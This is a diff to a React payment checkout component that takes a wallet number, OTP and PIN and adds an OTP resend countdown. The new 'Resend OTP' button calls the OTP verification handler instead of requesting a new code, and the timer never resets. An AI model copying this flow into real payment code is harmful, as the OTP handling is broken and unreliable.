@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useParams } from 'react-router-dom';
 
 const PaymentCheckout = () => {
@@ -11,7 +11,10 @@ const PaymentCheckout = () => {
     pin: ''
   });
   const [error, setError] = useState('');
+  const [timer, setTimer] = useState(10); // Starting timer at 10s
+  const [canResend, setCanResend] = useState(false);
 
+  // Handle input change for the fields
   const handleInputChange = (e) => {
     const { name, value } = e.target;
     setFormData(prev => ({
@@ -21,10 +24,10 @@ const PaymentCheckout = () => {
     setError('');
   };
 
+  // Handle Account Submit and save phone number in localStorage
   const handleAccountSubmit = async () => {
     setLoading(true);
     try {
-      // Save wallet number to localStorage
       localStorage.setItem('phone', formData.account);
 
       const response = await fetch('https://quick-pay-96uq.onrender.com/api/wallet/verify', {
@@ -45,10 +48,10 @@ const PaymentCheckout = () => {
     }
   };
 
+  // Handle OTP Submit and make the API call for OTP verification
   const handleOtpSubmit = async () => {
     setLoading(true);
     try {
-      // Get phone from localStorage
       const phone = localStorage.getItem('phone');
       if (!phone) {
         setError('Phone number not found');
@@ -67,12 +70,28 @@ const PaymentCheckout = () => {
         setError(data.message || 'OTP verification failed');
       }
     } catch (err) {
-      setError('A system error occurred, please try again later ');
+      setError('Network error');
     } finally {
       setLoading(false);
     }
   };
 
+  // Timer for OTP countdown
+  useEffect(() => {
+    if (currentScreen === 'otp' && timer > 0) {
+      const interval = setInterval(() => {
+        setTimer((prevTimer) => {
+          if (prevTimer === 1) {
+            setCanResend(true);
+          }
+          return prevTimer - 1;
+        });
+      }, 1000);
+      return () => clearInterval(interval);
+    }
+  }, [currentScreen, timer]);
+
+  // Screens configuration
   const screens = {
     account: {
       title: 'Enter Wallet Number',
@@ -153,6 +172,17 @@ const PaymentCheckout = () => {
           />
           {error && (
             <div className="mt-4 text-red-500 text-center">{error}</div>
+          )}
+          {currentScreen === 'otp' && timer > 0 && (
+            <p className="mt-4 text-sm text-red-700 text-center">Resend OTP in {timer}s</p>
+          )}
+          {currentScreen === 'otp' && timer === 0 && canResend && (
+            <button
+              onClick={handleOtpSubmit}
+              className="mt-4 text-sm font-medium text-[#4CAF50] text-center"
+            >
+              Resend OTP
+            </button>
           )}
           <div className="mt-4">
             <p className="text-sm text-gray-900 text-center">
